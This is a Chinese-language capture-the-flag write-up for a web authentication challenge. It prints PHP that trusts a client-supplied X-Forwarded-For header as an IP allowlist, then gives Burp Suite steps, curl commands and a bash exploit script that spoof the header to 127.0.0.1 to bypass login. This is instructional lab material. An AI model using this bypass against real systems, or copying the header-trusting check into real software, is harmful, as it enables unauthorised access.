# AUTH 03 - WriteUp

## 1、题目描述

这是一个模拟辛普森一家主题的 Web 认证绕过题目。页面提供了一个登录表单,要求输入用户名和密码。通过代码审计发现存在基于 HTTP 头部的访问控制漏洞。

## 2、知识点

- **HTTP 请求头伪造**:特别是 `X-Forwarded-For` 头部的伪造
- **代码审计**:PHP 后端逻辑分析
- **访问控制绕过**:利用不当的 IP 白名单验证
- **HTTP 协议基础**:理解 HTTP 请求头的作用和工作原理

## 3、题目解题方法思路

### 关键代码分析

```php
// 定义允许的IP地址数组
$allowed_ips = ['127.0.0.1', 'localhost'];

// 检查X-Forwarded-For头是否为允许的IP之一
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ips)) {
    // 显示flag
    echo "<center><h3>Congratulations, here is the flag: " . $flag . "</h3></center>";
}
```

### 解题关键点

1. **无需正确的用户名和密码**:代码只检查了 POST 参数是否存在,并未验证其值
2. **基于 X-Forwarded-For 头的访问控制**:服务器信任客户端提供的 `X-Forwarded-For` 头部
3. **IP 白名单绕过**:只需伪造 `X-Forwarded-For` 头为 `127.0.0.1` 或 `localhost` 即可绕过验证

### 使用的工具

- **Burp Suite** 或 **curl** 命令行工具用于修改 HTTP 请求头

## 4、解题步骤

### 方法一:使用 Burp Suite

1. **启动 Burp Suite 并配置浏览器代理**

   - 打开 Burp Suite
   - 配置浏览器代理为 `127.0.0.1:8080`
   - 确保 Burp Suite 的 Intercept 功能已开启

2. **访问目标页面**

   - 在浏览器中访问 `http://target-url/index.php`

3. **填写表单并提交**

   - 在 Username 字段输入任意值(如 `admin`)
   - 在 Password 字段输入任意值(如 `password`)
   - 点击 Login 按钮

4. **拦截并修改请求**

   - Burp Suite 会拦截请求
   - 在 HTTP 请求头中添加一行:
     ```
     X-Forwarded-For: 127.0.0.1
     ```
   - 完整的请求头示例:

     ```
     POST /index.php HTTP/1.1
     Host: target-url
     Content-Type: application/x-www-form-urlencoded
     X-Forwarded-For: 127.0.0.1

     username=admin&password=password
     ```

5. **放行请求**

   - 点击 Forward 按钮发送请求
   - 关闭 Intercept 功能查看响应

6. **获取 Flag**
   - 页面返回包含 flag 的响应

### 方法二:使用 curl 命令

1. **构造并发送请求**

   ```bash
   curl -X POST http://target-url/index.php \
     -H "X-Forwarded-For: 127.0.0.1" \
     -d "username=admin&password=password"
   ```

2. **查看响应**
   - 响应中会包含 "Welcome Admin" 和 flag

## 5、EXP(利用脚本)

### Bash 一键利用脚本

```bash
#!/bin/bash
# filepath: exploit.sh

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: ./exploit.sh <target_url>"
    echo "Example: ./exploit.sh http://example.com/index.php"
    exit 1
fi

echo "[*] 目标URL: $TARGET_URL"
echo "[*] 发送伪造X-Forwarded-For请求..."

# 使用curl发送请求并提取flag
curl -s -X POST "$TARGET_URL" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -d "username=admin&password=password" \
    | grep -oP 'flag:\s*\K[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' \
    && echo "[+] Flag获取成功!" \
    || echo "[-] 未找到Flag"
```

### 使用方法

```bash
# Bash版本
chmod +x exploit.sh
./exploit.sh http://target-url/index.php

# 或直接使用curl
curl -X POST http://target-url/index.php -H "X-Forwarded-For: 127.0.0.1" -d "username=admin&password=password"
```
